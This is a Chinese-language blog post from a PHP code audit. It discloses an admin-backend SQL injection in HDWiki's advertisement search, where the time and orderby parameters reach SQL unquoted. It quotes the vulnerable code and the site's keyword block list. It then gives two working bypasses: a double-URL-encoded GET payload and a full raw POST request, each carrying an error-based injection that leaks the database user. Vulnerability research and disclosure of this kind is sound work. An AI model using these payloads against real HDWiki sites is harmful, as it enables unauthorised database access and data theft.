---
title: hdwiki后台sql注入漏洞
date: 2019-04-27 23:03:47
tags: PHP代码审计
---

### 利用条件
后台注入漏洞，必须想办法登录后台（弱口令？）。
### 漏洞描述
注入漏洞发生在文件`control/admin_adv`的`dosearch`方法:

![](https://xzfile.aliyuncs.com/xzvul/b54cb9a88f4a49168469b6c7f324561e)

`$time`和`$orderBy`变量直接被带入
```
$count = $_ENV['adv']->search_adv_num($title,$time,$type);
```
和
```
$count = $_ENV['adv']->search_adv_num($title,$time,$type);
```

这两个方法在`model/adv.class.php`中：

```
function search_adv_num($title='',$time='',$type=''){
    $sql="SELECT  count(*)  FROM ".DB_TABLEPRE."advertisement WHERE 1=1 ";
    if($title){
    	$sql=$sql." AND title LIKE '%$title%' ";
    }
    if($time){
    	$sql=$sql." AND endtime-starttime<=$time "; //$time参数没有单引号，可以注入
    }
    if(''!==$type){
    	$sql=$sql." AND type='$type' ";
    }
    return $this->db->result_first($sql);
    }
```

```
function search_adv($start=0,$limit=10, $title='',$time='',$type='', $orderby='type' ){
	$advlist=array();
	$sql="SELECT * FROM ".DB_TABLEPRE."advertisement WHERE 1=1 ";
	if($title){
		$sql=$sql." AND title LIKE '%$title%' ";
	}
	if($time){
		$sql=$sql." AND endtime-starttime<=$time ";  //没有单引号，可以注入
	}
	if(''!==$type){
		$sql=$sql." AND type='$type' ";
	}
	$sql=$sql." ORDER BY $orderby DESC LIMIT $start,$limit "; // orderBy可以注入
	
	$query=$this->db->query($sql);
	while($adv=$this->db->fetch_array($query)){
		if($adv['starttime']!=='0'){
			$adv['starttime']=date('Y-m-d',$adv['starttime']);
		}
		if($adv['endtime']!=='0'){
			$adv['endtime']=date('Y-m-d',$adv['endtime']);
		}
		$adv['parameters']=unserialize($adv['parameters']);
		$adv=$this->adv_filter($adv);
		$advlist[]=$adv;
	}
	return $advlist;
}
```

### 安全防御绕过
HDWiki的安全防御机制比较混乱（可能是修补频繁的原因）。
大致如下：

防御机制在 `model/hdwiki.class.php`中:

```
function init_request(){
	//省略代码
	$querystring=str_replace("'","",urldecode($_SERVER['QUERY_STRING'])); //去掉单引号
	if(strpos($querystring , 'plugin-hdapi-hdapi-default') !== false){
		$querystring=str_replace('plugin-hdapi-', '', $querystring);
	}
	$pos = strpos($querystring , '.');
	if($pos!==false){
		$querystring=substr($querystring,0,$pos);
	}
	$this->get = explode('-' , $querystring);
	//省略代码
}

//过滤关键字
function checksecurity() {
	$check_array = array(
		'get'=>array('cast', 'exec', 'insert', 'select', 'delete', 'update', 'execute', 'from', 'declare', 'varchar', 'script', 'iframe', ';', '0x', '<', '>', '\\', '%27', '%22', '(', ')'),
	);
	foreach ($check_array as $check_key=>$check_val) {
		if(!empty($this->$check_key)) {
			foreach($this->$check_key as $getvalue) {
				foreach ($check_val as $invalue) {
					if(stripos($getvalue, $invalue) !== false){
						exit('No Aceess!注意敏感词!');
					}
				}
			}
		}
	}
}
```
1. 过滤了单引号，%27，导致我们没法对有单引号的sql进行注入。
2. 过滤关键字，导致即使有注入点没法利用注入语句，比如`select`。

有两种绕过方式：

1. 利用urlencode二次编码

访问

http://localhost/hkwiki/index.php?admin_adv-search-1-1%20and%20%2528s%2565lect%201%20%2566rom%20%2528s%2565lect%20count%2528*%2529,concat%2528user%2528%2529,floor%2528rand%25280%2529*2%2529%2529x%20%2566rom%20information_schema%252etables%20group%20by%20x%2529a%2529

给字母也url二次编码，绕过关键字检查。

我开启了报错模式，为了更清晰的展示：

![](https://xzfile.aliyuncs.com/xzvul/46a4c80279a14d57b1ee649197b79638)

默认没开启报错模式，可以用一般盲注语句测试。

2. 关键字过滤只限制了get，没有限制post，直接提交post请求。

数据包：

```
POST /hkwiki/index.php?admin_adv-search HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:64.0) Gecko/20100101 Firefox/64.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Referer: http://localhost/hkwiki/index.php?admin_adv
Content-Type: application/x-www-form-urlencoded
Content-Length: 169
Connection: close
Cookie: hd_sid=PsiDn7; hd_auth=0b25ZPkhQuEoRhftnXsGkawqfXsuzbedeiv5AAgNbeQt3obgeDm8ppZLeFoEn8%2FnzGBDbyKD3KnOiAtPVvLr; hd_querystring=admin_adv
Upgrade-Insecure-Requests: 1

title=asf&time=604800  and (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a)&type=&searchsubmit=%CB%D1+%CB%F7
```
![](https://xzfile.aliyuncs.com/xzvul/37b60da8d6ce4a688d53e4b067b33061)

